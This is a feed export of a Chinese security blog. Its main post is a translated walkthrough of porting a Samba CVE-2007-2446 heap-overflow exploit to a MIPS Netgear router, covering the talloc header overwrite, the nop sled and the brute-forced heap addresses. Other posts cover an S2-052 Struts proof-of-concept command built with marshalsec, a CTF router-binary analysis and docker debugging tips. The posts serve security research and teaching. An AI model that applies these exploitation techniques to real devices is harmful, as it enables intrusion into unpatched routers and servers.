prs_debug(ps, depth, desc, <span class="string">"lsa_io_trans_name"</span>); 
depth++; 
if(!prs_align(ps)) 
return False; 
if(!prs_uint16(<span class="string">"sid_name_use"</span>, ps, depth, &amp;trn-&gt;sid_name_use)) 
return False; 
if(!prs_align(ps)) 
return False; 
if(!smb_io_unihdr (<span class="string">"hdr_name"</span>, &amp;trn-&gt;hdr_name, ps, depth)) 
return False; 
if(!prs_uint32(<span class="string">"domain_idx "</span>, ps, depth, &amp;trn-&gt;domain_idx)) 
return False; 
return True; 
} 
</code></pre><p>动态调试发现，prs_unit16,smb_io_unihdr,prs_uint32,这里都会解析数据写入761AF208。一次循环写入16个字节。而dos 模块中设置的num_entries2是100。循环100次，导致堆溢出。</p>
<p>图为执行完循环，堆内存被破坏。</p>
<p><img src="/images/cve200724467.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前翻译的&lt;a href=&quot;http://xdxd.love/2017/10/16/netgear-WNR2200%E7%9A%84%E4%B8%80%E4%B8%AAheap-overflow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&quot;&gt;【
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>【翻译】netgear WNR2200的一个heap overflow漏洞利用</title>
    <link href="http://xdxd.love/2017/10/16/netgear-WNR2200%E7%9A%84%E4%B8%80%E4%B8%AAheap-overflow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://xdxd.love/2017/10/16/netgear-WNR2200的一个heap-overflow漏洞利用/</id>
    <published>2017-10-16T10:20:17.000Z</published>
    <updated>2017-10-30T03:23:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>软件漏洞和对应的利用程序现在已经非常常见了。幸运的是近几年对于漏洞的响应速度和补丁的更新时间也有了显著提高。但是在嵌入式设备的领域，由于固件升级需要用户下载一个新的固件包，然后升级设备才能解决存在的问题，所以嵌入式设备通常都是使用了比较老的操作系统和软件，没有及时更新到安全的新版本。</p>
<p>但是由于嵌入式设备为了省电的原因通常都是使用RISC架构的CPU，比如ARM和MIPS。而目前的大部分exploit都是针对X86的，针对RISC的POC相对较少也导致嵌入式设备的安全没有得到足够的重视。</p>
<p>本篇博客介绍将一个已知的x86的exploit修改成适用于mips架构的过程。分析对象为netgear WNR2200路由器。</p>
<h2 id="固件分析">固件分析</h2><p>为了寻找合适的exploit，需要先对固件进行分析。从网上可以下载到<br> (version 1.0.1.96) 版本的固件，解压之后发现是个img后缀的文件。使用binwalk进行分析如下：</p>
<pre><code>DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
<span class="number">192</span>           <span class="number">0xC0</span>            Squashfs filesystem, big endian,
version <span class="number">3.0</span>, size: <span class="number">6033818</span> bytes,{jump-to-offset:<span class="number">6033818</span>}{file-size:<span class="number">6033818</span>}
<span class="number">1379</span> inodes, blocksize: <span class="number">65536</span> bytes, created: Thu Mar <span class="number">26</span> <span class="number">03</span>:<span class="number">33</span>:<span class="number">52</span> <span class="number">2015</span>
<span class="number">336044</span>        <span class="number">0x520AC</span>         LZMA compressed data, properties:
<span class="number">0x5D</span>, dictionary size: <span class="number">8388608</span> bytes, uncompressed size: <span class="number">2740358</span> bytes
</code></pre><p>根据分析结果，binwalk识别出在这个文件中包含一个squashFS格式的文件系统。使用unsquashfs工具进行分析。命令为<br>“unsquashfs –s”</p>
<pre><code>Reading a different endian SQUASHFS filesystem <span class="function_start"><span class="keyword">on</span></span> C0.squashfs
Found a valid big endian SQUASHFS <span class="number">3</span>:<span class="number">0</span> superblock <span class="function_start"><span class="keyword">on</span></span> C0.squashfs.
Creation <span class="keyword">or</span> <span class="keyword">last</span> append <span class="property">time</span> Thu Mar <span class="number">26</span> <span class="number">03</span>:<span class="number">33</span>:<span class="number">52</span> <span class="number">2015</span>
Filesystem size <span class="number">5892.40</span> Kbytes (<span class="number">5.75</span> Mbytes)
Block size <span class="number">65536</span>
Filesystem <span class="keyword">is</span> <span class="keyword">not</span> exportable via NFS
Inodes are compressed
Data <span class="keyword">is</span> compressed
Fragments are compressed
Always_use_fragments option <span class="keyword">is</span> <span class="keyword">not</span> specified
Check data <span class="keyword">is</span> <span class="keyword">not</span> present <span class="keyword">in</span> <span class="keyword">the</span> filesystem
Duplicates are removed
Number <span class="keyword">of</span> fragments <span class="number">101</span>
Number <span class="keyword">of</span> inodes <span class="number">1379</span>
Number <span class="keyword">of</span> uids <span class="number">1</span>
Number <span class="keyword">of</span> gids <span class="number">0</span>
</code></pre><p>这也确认了固件文件中确实存在一个有效的SquashFS格式的文件系统。然后尝试进行解压，程序报错。</p>
<pre><code>Reading a different endian SQUASHFS filesystem <span class="keyword">on</span> C0.squashfs
<span class="keyword">Parallel</span> unsquashfs: <span class="keyword">Using</span> <span class="number">8</span> processors
gzip uncompress failed <span class="keyword">with</span> error code -<span class="number">3</span>
read_block: failed <span class="keyword">to</span> <span class="keyword">read</span> <span class="keyword">block</span> @<span class="number">0</span>x5c0f6d
read_fragment_table: failed <span class="keyword">to</span> <span class="keyword">read</span> fragment table <span class="keyword">block</span>
FATAL ERROR:failed <span class="keyword">to</span> <span class="keyword">read</span> fragment table
</code></pre><p>通过对这个错误信息进行调查分析，得知可能是使用了非标准的squashfs进行的压缩。我下载了最新版的SquashFS工具，重新进行编译。但是还是解压失败。更进一步的分析发现Firmware Mod Kit这个工具可能可以解压这个固件，虽然FMK这个工具好久不更新了。最后使用FMK的unsquashfs_all脚本，成功解压了固件。程序识别出，固件使用的squashfs版本为”./src/squashfs-3.0/mksquashfs-lzma”。</p>
<p>解压之后发现是一个基于OpenWRT的linux系统。老的Netgear路由器通过发送一个特定的包可以打开telent，具体的<a href="https://wiki.openwrt.org/toh/netgear/telnet.console" target="_blank" rel="external">技术分析参考</a>。连上telnet之后可以获得OpenWRT的版本为Kamikaze。</p>
<pre><code>BusyBox v1.4.2 (2013-12-23 15:48:24 CST) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

 _______                     ________        __ 
|<span class="string">       </span>|<span class="string">.-----.-----.-----.</span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">.----.</span>|<span class="string">  </span>|<span class="string">_ 
</span>|<span class="string">   -   </span>||<span class="string">  _  </span>|<span class="string">  -__</span>|<span class="string">     </span>||<span class="string">  </span>|<span class="string">  </span>|<span class="string">  </span>||<span class="string">   _</span>||<span class="string">   _</span>|<span class="string"> 
</span>|<span class="string">_______</span>||<span class="string">   __</span>|<span class="string">_____</span>|<span class="string">__</span>|<span class="string">__</span>||<span class="string">________</span>||<span class="string">__</span>|<span class="string">  </span>|<span class="string">____</span>|
         |<span class="string">__</span>|<span class="string"> W I R E L E S S   F R E E D O M
KAMIKAZE (7.09)
-----------------------------------
 - 10 oz Vodka       Shake well with ice and strain
 - 10 oz Triple sec  mixture into 10 shot glasses.
 - 10 oz lime juice  Salute!
---------------------------------------------------
root@WNR2200:/#</span>
</code></pre><p>其他的版本信息<br><img src="/images/netgearsamba1.png" alt=""></p>
<p>很幸运，samba和linux kernel的版本都很低，更容易找到相对应的漏洞利用。</p>
<h2 id="虚拟机运行samba进程">虚拟机运行samba进程</h2><p>现在我们有了整个解压之后的虚拟机固件，第一步是想在qemu虚拟机中运行起来，当然我们选择只是虚拟运行samba进程。</p>
<p>首先需要安装qemu-static相关的程序。然后把“qemu-mips-static”复制到固件的根目录，之后使用chroot切换到固件的根目录执行。命令如下：</p>
<pre><code>“sudo chroot . ./qemu-mips-<span class="keyword">static</span> -g <span class="number">5656</span> ./usr/sbin/smbd -i -d <span class="number">10</span> &gt; fileout.txt”
</code></pre><p>具体解释一下这个命令：</p>
<p>1，chroot到固件的目录下，这样samba就可以认为固件目录是文件根目录。可以加载相关的lib库文件。</p>
<p>2，使用qemu虚拟运行samba。g参数是开启gdb调试，监听在5656端口。</p>
<p>3，d参数是设置调试模式为最高10。这样可以输出更多的调试信息。</p>
<p>4，重定向输出信息到文件里，方便后期查看。</p>
<p>运行这个文件的时候，会遇到一些问题。提示samba找不到smb.conf文件。在正常运行的路由器里查看，在/tmp目录有一些配置文件，但是在解压出来的固件里这个目录是空白的。可见这些文件是系统启动的时候，动态创建的。所以我们需要手动创建这些缺失的文件。</p>
<p>主要涉及到以下文件：</p>
<p>/etc/init.d/samba  这个文件会动态创建所需要的目录，复制配置到/tmp目录。然后执行下面的2个程序。</p>
<p>/usr/sbin/update_user 一个bash脚本。在/tmp/passwd文件中写入用户信息。</p>
<p>/usr/sbin/update_smb 一个二进制文件。更新tmp目录下的smb.conf配置信息。</p>
<p>bash脚本中的命令，可以手动一条条的执行。二进制文件使用 qemu-mips-static 模拟执行。最后检查/etc/目录中的相关软链接是否正确指向到了正确的文件。这时最开始的命令就可以正确执行了。</p>
<h2 id="寻找漏洞">寻找漏洞</h2><p>对应的samba版本的源代码可以在这里<a href="https://download.samba.org/pub/samba/stable/" target="_blank" rel="external">下载</a> 。通过查找对应版本存在的CVE发现一个典型的堆溢出漏洞。这个数据中有一个数值用来分配缓冲区，然后程序利用第二个数值来解组数据，写进缓冲区。如果第一个数值小于第二个数值就会导致堆溢出漏洞。</p>
<p>这个漏洞的编号是CVE-2007-2446。samba使用一个自定义的堆分配器talloc。talloc使用树形结构分配内存。在树形结构的任何一个节点都可以释放这个和他的子节点。为了实现这个特性，talloc实现了一个自定义的释放程序，他的指针保存在堆的元数据上，可以通过溢出覆盖。当一个chunk被释放的时候，通过覆盖堆的元数据可以实现任意代码执行。</p>
<p>已经有个x86的<a href="https://www.exploit-db.com/exploits/16875/" target="_blank" rel="external">metasploit利用模块</a>。这会对我们想在MIPS目标上实现漏洞利用有比较大的帮助。</p>
<h2 id="动态调试">动态调试</h2><p>现在我们已经已经可以用qemu虚拟机运行samba程序。使用IDA加载samba二进制文件，然后使用debugger模块可以进行远程调试。</p>
<p>一开始调试我们就遇到了一个问题。IDA直接展示了进程的整个内存空间的扁平视图，但是IDA并没有正确识别出我们的二进制文件中的起始位置。这导致在内存视图中所有的符号都没有关联到正确的位置，甚至IDA都无法识别哪些区域是数据哪些区域是代码。在这样的环境中调试是比较困难的，因为我们无法再感兴趣的函数上断点，也无法知道当前运行的是哪个函数。下图展示了IDA加载了进程之后的内存布局<br><img src="/images/netgearsamba2.png" alt=""></p>
<p>我一开始推测IDA停在的这个初始的点是在smbd的二进制程序中。但是通过比较smbd的main函数和二进制文件的入口点发现都不是。在这个断点处选取一些指令进行搜索，在smbd中却没有找到对应的结果。这让我觉得这段代码可能并不在smbd中。</p>
<p>为了定位这个函数，我向后寻找到最近的一个页边界。获得了一些有用的信息。</p>
<p>模块页边界 地址0x76436000<br><img src="/images/netgearsamba3.png" alt=""></p>
<p>从上图可以看到ELF这个魔术值。通过分析头上的指令可以知道这是ld-uClibc.so.0中的代码。通过readelf分析smbd可以确定ld-uClibc.so.0是smbd的动态加载器。</p>
<p>分析uClibc的代码发现这里可能是uClibc/ldso/ldso/mips/dl-startup.h相关的函数。函数中的最后一个跳转指令是跳到真正的二进制文件的入口点。单步调试跟踪到该跳转指令然后进入跳转，会让我们来到如下的代码处。<br><img src="/images/netgearsamba4.png" alt=""></p>
<p>0x76CB76C0 处的代码看起来很像是二进制程序的入口点。__uClibc_main的调用指令也印证了这一点。</p>
<p>我在IDA的反汇编里查找了一下__uClibc_main的交叉引用，结果有好几个。其中一个是上图中的函数。这个函数在二进制文件中的偏移是0x0003B6C0。使用内存中的地址0x76CB76C0减去二进制文件中的地址，得到在内存中的基址是0x76C7C000。然后使用IDA的rabase功能，填入正确的基址。这样调试的时候就可以看到正确的符号和函数名。</p>
<p><img src="/images/netgearsamba5.png" alt=""></p>
<h2 id="修改x86的利用程序">修改x86的利用程序</h2><p>首先需要修改的是获得一个针对mips的nop sled。因为内存布局不是百分百可以预测的，所有利用程序使用了nop sled技术来提高利用的成功率。所谓nop sled就是一堆什么都不做的处理器指令。它不会改变程序的状态。所以我们把一大段这种指令放在内存中，从这段指令的任何一个位置开始执行，都可以正常执行到我们真正的payload指令。这样可以提高成功率。</p>
<p>在MIPS汇编语言中，最基本的nop指令就是0x00000000，对应的汇编语言为“sll $0, 0”。一共大概有接近170个MIPS指令可以作为没有副作用的NOP指令。</p>
<p>如下图所示：</p>
<p><img src="/images/netgearsamba6.png" alt=""></p>
<h2 id="调试exploit">调试exploit</h2><p>本来也没有预期一次可以成功，第一次运行的时候在talloc_chunk_from_ptr函数中抛出了异常。<br><img src="/images/netgearsamba7.png" alt=""></p>
<p>talloc_chunk_from_ptr函数的作用是传入内存地址，给出相应的chunk的header和metadata。此外它还会验证元数据中的魔术数字是否是有效的和当前内存是否已经释放。异常出现在图中标识的代码上方，当从$a0寄存器的某个偏移处加载数据时异常。在MIPS架构中，$a0寄存器用来传递函数的第一个参数。查看一下寄存器的值可以看到，$a0的值是0x41414141。漏洞利用程序覆盖了一个chunk 的header。导致一些header中一些重要的值(魔术字和一些重要的指针)。</p>
<p><img src="/images/netgearsamba8.png" alt=""></p>
<p>所以初步假设元数据中的几个指针(前一个chunk,后一个chunk，父节点和子节点)被覆盖成了不正确的值。检查exploit的代码发现只有next和prev两个指针被设置成了0x41414141。为了进一步确认我们的猜想，可以看一下crash时候的调用栈。</p>
<p><img src="/images/netgearsamba9.png" alt=""></p>
<p>在crash之前，talloc_total_size被调用。分析一下这个函数的代码可以证实我们的猜测。</p>
<p><img src="/images/netgearsamba10.png" alt=""></p>
<p>上图展示了talloc_total_size函数的源码。用来计算内存分配树某个特定分支的大小。这个函数是递归的，并在每次迭代时会调用talloc_chunk_from_prt函数(发生崩溃的函数)，参数是链表的指针。图中高亮的代码“c=c-&gt;next”就是那个错误的值进入了talloc_total_size函数，最终进入talloc_chunk_from_prt的根源。</p>
<p>修复这个崩溃相对来说也比较简单。只要我们将覆盖头文件的next和prev指针的值修改为0x00000000,talloc_total_size中的循环将会提前终止，我们的指针就不会进入到后面的处理函数。</p>
<p>修改这个点之后，exploit就成功运行了。程序计数器成功被我们的标记值覆盖。</p>
<h2 id="重定向执行流程">重定向执行流程</h2><p>现有的exploit通过发送一个特定的SMB请求，在内存中创建一个巨大的nop sled。当这个缓冲区被解组的时候，会分配另一个缓冲区并写入数据溢出。溢出的talloc头部有一个函数指针被覆盖指向了原始缓冲区(nop sled位置)。由于堆内存的布局并不是百分百确定的，所以可以尝试暴力猜测，根据堆内存可能的位置每次每次使用不一样的控制指针。如果尝试失败，进程实例会被结束。因为samba是为每个进入的连接创建一个进程来处理，所以一个实例被杀掉是可以接受的。</p>
<p>除了暴力尝试猜测堆地址，我们尝试找到一个更可控的方式来控制执行流程。MIPS比x86架构有更多的寄存器，所以当获得执行权限的时候，其中更可能存在一些可预测的和有利用价值的值。可能存在实现ROP利用的机会，而ROP的利用会更加稳定。经过分析，尽管部分寄存器指向堆上可控的数据，但是却是不可利用的。他们指向的是talloc头部被溢出覆盖的区域。因为talloc头部在被写入和执行之间会被修改，所以尝试在这个区域写入shellcode是没法成功的。尝试找一个带偏移的寄存器来绕过这段不稳定的区域但是没有成功，没有找到合适的gadget。</p>
<p>既然没有找到更稳定的ROP利用，只好回到暴力堆地址的方法上来。在路由器上分析smbd的进程内存布局发现所有的实例的内存布局都是相同的，即使系统重新启动。这表明内核没有开启ASLR，内存布局都是可以预测的。有意思的是通过查看/proc/sys/kernel/randomize_va_space 文件的值为1。这表明内核认为ASLR已经开启了。</p>
<p>想要找到合适的地址需要先知道堆的边界，通过查看“/proc//maps” 就可以。查看路由器的这个文件显示如图。<br><img src="/images/netgearsamba11.png" alt=""></p>
<p>根据上图中的值，0x558be000到0x55965000可以作为暴力猜测的边界。</p>
<p>悲伤的是，利用这个边界暴力猜测失败了，metasploit并没有返回session。在qemu模拟系统上进一步调试发现，只要堆的范围正确，exploit是可以成功利用的。虽然不是很清楚为啥失败了，但是通过增加暴力猜测的范围为0x558b0000 -  0x559c0000 ，程序利用成功了。<br><img src="/images/netgearsamba12.png" alt=""></p>
<p>最终在在0x559b4000地址处，exploit成功利用。这个地址是稳定的，而且系统重启也不会发生变化。奇怪的是这个地址是在系统显示的堆的边界以外的。我还没有发现这个问题的根本原因，不过我猜测堆内存在运行过程中范围增加了，但是系统并没有恰当的跟踪好变化后的地址范围。</p>
<h2 id="备注">备注</h2><p>1，解压固件使用最新版的binwalk已经可以直接解压。docker版binwalk工具：<a href="https://github.com/stayliv3/embedded-device-lab/tree/master/docker-binwalk" target="_blank" rel="external">download</a><br>2，metasploit已经更新了针对mips samba的exploit。可以直接成功利用。<br>3，<a href="https://www.contextis.com/blog/porting-exploits-netgear-wnr2200" target="_blank" rel="external">原文地址：</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;软件漏洞和对应的利用程序现在已经非常常见了。幸运的是近几年对于漏洞的响应速度和补丁的更新时间也有了显著提高。但是在嵌入式设备的领域，由于固件升级需要用户下载一个新的固件包，然后升级设备才能解决存在的问题，所以嵌入式设备通常都是使用了比较老的操作系统和软件，没有及时更新到安全
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
      <category term="万物互联" scheme="http://xdxd.love/tags/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
  </entry>
  
  <entry>
    <title>使用vscode远程调试docker容器内的php应用</title>
    <link href="http://xdxd.love/2017/09/13/%E4%BD%BF%E7%94%A8vscode%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E5%AE%B9%E5%99%A8%E5%86%85%E7%9A%84php%E5%BA%94%E7%94%A8/"/>
    <id>http://xdxd.love/2017/09/13/使用vscode远程调试docker容器内的php应用/</id>
    <published>2017-09-13T07:14:38.000Z</published>
    <updated>2017-09-13T07:43:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>经常使用docker搭建各种环境进行漏洞测试。如何调试docker内的代码的也成为了一个新需求。使用xdebug插件，可以方便的调试docker内的php应用。</p>
<h2 id="docker环境安装xdebug">docker环境安装xdebug</h2><p>已经整合成docker-compose环境。可以直接clone <a href="https://github.com/stayliv3/docker-xdebug" target="_blank" rel="external">github.com/stayliv3/docker-xdebug</a>。</p>
<p>修改xdebug.ini文件内的xdebug.remote_host=172.16.1.203  ip为vscode的机器IP(docker宿主机ip)。</p>
<h2 id="vscode_配置">vscode 配置</h2><p>vscode安装PHP Debug Adapter for Visual Studio Code。</p>
<p>配置文件为：</p>
<pre><code><span class="collection">{
    <span class="string">"version"</span>: <span class="string">"0.2.0"</span>,
    <span class="string">"configurations"</span>: <span class="collection">[

        <span class="collection">{
            <span class="string">"name"</span>: <span class="string">"Listen for XDebug"</span>,
            <span class="string">"type"</span>: <span class="string">"php"</span>,
            <span class="string">"request"</span>: <span class="string">"launch"</span>,
            <span class="string">"port"</span>: <span class="number">9000</span>,
            // <span class="string">"stopOnEntry"</span>: <span class="number">1</span>, 运行开始断点，用于调试。
            <span class="string">"serverSourceRoot"</span>: <span class="string">"/var/www/html/"</span>,
            <span class="string">"localSourceRoot"</span>: <span class="string">"/Users/xxxxx/security/coding/xdebug-docker/app"</span>
        }</span>,
        <span class="collection">{
            <span class="string">"name"</span>: <span class="string">"Launch currently open script"</span>,
            <span class="string">"type"</span>: <span class="string">"php"</span>,
            <span class="string">"request"</span>: <span class="string">"launch"</span>,
            <span class="string">"program"</span>: <span class="string">"${file}"</span>,
            <span class="string">"cwd"</span>: <span class="string">"${fileDirname}"</span>,
            <span class="string">"port"</span>: <span class="number">9000</span>
        }</span>
    ]</span>
}</span>
</code></pre><p>主要是配置serverSourceRoot和localSourceRoot两个路径。localSourceRoot为vscode看到的php文件路径。然后就可以设置断点，使用vscode进行调试了。</p>
<p><img src="/images/dockerdebug1.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;经常使用docker搭建各种环境进行漏洞测试。如何调试docker内的代码的也成为了一个新需求。使用xdebug插件，可以方便的调试docker内的php应用。&lt;/p&gt;
&lt;h2 id=&quot;docker环境安装xdebug&quot;&gt;docker环境安装xdebug&lt;/h2&gt;&lt;p&gt;已经
    
    </summary>
    
      <category term="cve and others" scheme="http://xdxd.love/categories/cve-and-others/"/>
    
    
  </entry>
  
  <entry>
    <title>S2-052简单测试</title>
    <link href="http://xdxd.love/2017/09/07/S2-052%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95/"/>
    <id>http://xdxd.love/2017/09/07/S2-052简单测试/</id>
    <published>2017-09-07T01:54:50.000Z</published>
    <updated>2017-09-07T02:51:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞公告">漏洞公告</h2><p><img src="/images/s20521.png" alt=""></p>
<h2 id="测试环境">测试环境</h2><p>网上公开比较早的是CSDN的这个博客。<a href="https://github.com/jas502n/St2-052" target="_blank" rel="external">不过很快删掉了</a>。由于有快照，网上也出现了很多转载。</p>
<p>测试环境使用vulhub。直接使用048的测试环境，替换成新的app就可以。docker-compose.yml如下：</p>
<pre><code><span class="attribute">version</span>: <span class="string">'2'</span>
<span class="attribute">services</span>:
 <span class="attribute">struts2</span>:
   <span class="attribute">image</span>: vulhub/<span class="attribute">struts2</span>:<span class="number">2.3</span>.<span class="number">32</span>-showcase
   <span class="attribute">volumes</span>:
    - ./ROOT.<span class="attribute">war</span>:/usr/local/tomcat/webapps/ROOT.war
   <span class="attribute">ports</span>:
    - <span class="string">"8080:8080"</span>
</code></pre><p>测试用的<a href="http://archive.apache.org/dist/struts/2.3.32/struts-2.3.32-apps.zip" target="_blank" rel="external">app用的2.3.32版本</a></p>
<h2 id="marshalsec">marshalsec</h2><pre><code>java -cp target/marshalsec-<span class="number">0.0</span>.<span class="number">1</span>-SNAPSHOT-all<span class="class">.jar</span> marshalsec<span class="class">.XStream</span>  ImageIO  touch /tmp/ls
</code></pre><p>使用marshalsec生成测试poc</p>
<p>官方也不是很靠谱，一开始说是影响2.5-2.5.12。结果用2.3.32测试同样存在漏洞。后来官方又修改了公告。影响范围为2.1.2-2.3.33，2.5-2.5.12</p>
<h2 id="参考资料">参考资料</h2><p><a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/" target="_blank" rel="external">S2-052漏洞分析及官方缓解措施无效验证</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞公告&quot;&gt;漏洞公告&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/s20521.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;测试环境&quot;&gt;测试环境&lt;/h2&gt;&lt;p&gt;网上公开比较早的是CSDN的这个博客。&lt;a href=&quot;https://github.com
    
    </summary>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>一个简单mips可执行文件分析</title>
    <link href="http://xdxd.love/2017/09/06/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95mips%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2017/09/06/一个简单mips可执行文件分析/</id>
    <published>2017-09-06T08:31:04.000Z</published>
    <updated>2017-09-06T08:58:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="http://bbs.pediy.com/thread-219062.htm" target="_blank" rel="external">[分享]蝶澈的CTF题</a></p>
<p>之前分析蝶澈的CTF题过程中，学到了一些新东西。一直想记录一下，算是交流和来往。可是等到忘的快差不多了也还是没写。</p>
<h2 id="简单分析">简单分析</h2><p>看到文件名感觉像是一个正常的设备固件，搜索一下发现是一个真是的路由器的固件，还曾出过漏洞。<br><img src="/images/kanxue1.png" alt=""><br>下载了原版固件，使用binwalk解包之后，对所有的文件进行了对比。<br>我采用的方式是针对每个文件hash，然后比较。</p>
<pre><code>find . -type f |xargs md5 &gt; test.txt
diff <span class="number">1.</span>txt <span class="number">2.</span>txt
</code></pre><p><img src="/images/kanxue2.png" alt=""></p>
<p>可以看到文件大概有3处修改，增加了nc文件，passwd和services文件。以及help目录删掉了一些文件。</p>
<p>看蝶澈的writeup中使用了<a href="https://github.com/bmaia/binwally这个工具做两个目录的文件比较。" target="_blank" rel="external">https://github.com/bmaia/binwally这个工具做两个目录的文件比较。</a></p>
<h2 id="静态分析：">静态分析：</h2><p>看一下字符串，可以看到不少有价值的字符串。不过看不到中文的字符串。<br><img src="/images/kanxue3.png" alt=""></p>
<p>直接cat可以看到中文：<br><img src="/images/kanxue4.png" alt=""></p>
<h2 id="动态调试">动态调试</h2><p>路由器的环境搭建可以参考<a href="http://bbs.pediy.com/thread-212369.htm" target="_blank" rel="external">看雪</a>。通常来说搭建一个mips的调试环境还是需要花费不少时间，踩一些坑的。为了方便分析。我做了一个基于docker的一键测试环境<a href="https://github.com/stayliv3/embedded-device-lab" target="_blank" rel="external">embedded-device-lab</a>可以直接使用gdb或者ida动态调试。</p>
<p>经过简单的尝试，发现应该是需要输入一个密码。如果密码正确，可以获得flag。<br><img src="/images/kanxue5.png" alt=""></p>
<p>通过getflag。socket等关键字，可以定位到关键函数400310。通过一番调试发现，</p>
<p>这里：</p>
<pre><code>loc_40071<span class="number">0</span>:
lw      <span class="variable">$v1</span>, <span class="number">0x850</span>+var_83<span class="number">0</span>(<span class="variable">$fp</span>)
li      <span class="variable">$v0</span>, <span class="number">1</span>
beq     <span class="variable">$v1</span>, <span class="variable">$v0</span>, loc_40038C
nop
</code></pre><p>需要v1不等v0才能进入有getflag相关的逻辑。而当我们随便输入密码的时候，v1都是等于v0=1的。所以，在这里把v0修改成其他的值，就可以继续运行到getflag相关的逻辑。<br><img src="/images/kanxue7.png" alt=""></p>
<p>其实我也分析过了一下加密的函数，只是没看懂。<br><img src="/images/kanxue6.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-219062.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;[分享]蝶澈的CTF题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;之前分析蝶澈的CTF题
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>openstack虚拟机上docker容器无法上网解决方案</title>
    <link href="http://xdxd.love/2017/09/04/openstack%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8Adocker%E5%AE%B9%E5%99%A8%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BD%91%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://xdxd.love/2017/09/04/openstack虚拟机上docker容器无法上网解决方案/</id>
    <published>2017-09-04T06:30:52.000Z</published>
    <updated>2017-09-04T07:11:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题">问题</h2><p>虚拟机上安装docker之后，docker容器内无法访问外网。DNS解析和部分http可以通信。</p>
<p>虚拟机版本为：ubuntu 14.04<br>docker版本为：17.07.0-ce<br>虚拟环境为：openstack</p>
<h2 id="GOOGLE">GOOGLE</h2><p>搜索发现可能是由于openstack默认mtu是1450，而docker默认mtu是1500导致的。ifconfig查看，果然如此。eth0 mtu是1450.而docker0 mtu是1500.</p>
<h2 id="探索">探索</h2><p>尝试修改docker0的mtu。发现了两个方案：</p>
<p>1，编辑/etc/docker/daemon.json文件。ubuntu上默认没有这个文件。可以新建，内容如下。</p>
<pre><code>{
  "<span class="attribute">mtu</span>": <span class="value"><span class="number">1500</span>
</span>}
</code></pre><p>2，编辑/etc/default/docker文件。ubuntu上有这个文件。默认内容为空。</p>
<pre><code>DOCKER_OPTS=“--mtu=<span class="number">1450</span><span class="string">"</span>
</code></pre><p>测试发现这两个方法修改之后。docker0显示的mtu依然是1500。此时陷入迷茫。</p>
<p>通过docker network inspect bridge 命令发现bridge网络的属性中mtu被设置成了1450.如下：</p>
<pre><code><span class="string">"Options"</span>: {

    <span class="string">"com.docker.network.bridge.default_bridge"</span>: <span class="string">"true"</span>,

    <span class="string">"com.docker.network.bridge.enable_icc"</span>: <span class="string">"true"</span>,

    <span class="string">"com.docker.network.bridge.enable_ip_masquerade"</span>: <span class="string">"true"</span>,

    <span class="string">"com.docker.network.bridge.host_binding_ipv4"</span>: <span class="string">"0.0.0.0"</span>,

    <span class="string">"com.docker.network.bridge.name"</span>: <span class="string">"docker0"</span>,

    <span class="string">"com.docker.network.driver.mtu"</span>: <span class="string">"1450"</span>

},
</code></pre><p>而我测试的docker容器使用了docker compose。看了下<a href="https://docs.docker.com/compose/networking/#updating-containers" target="_blank" rel="external">docker compose的文档</a>。得知docker compose会自动创建一个新的网络。可以通过如下的方式配置网络的参数：</p>
<pre><code><span class="attribute">networks</span>:
  <span class="attribute">frontend</span>:
    # Use a custom driver
    <span class="attribute">driver</span>: custom-driver-<span class="number">1</span>
  <span class="attribute">backend</span>:
    # Use a custom driver which takes special options
    <span class="attribute">driver</span>: custom-driver-<span class="number">2</span>
    <span class="attribute">driver_opts</span>:
      <span class="attribute">foo</span>: <span class="string">"1"</span>
      <span class="attribute">bar</span>: <span class="string">"2"</span>
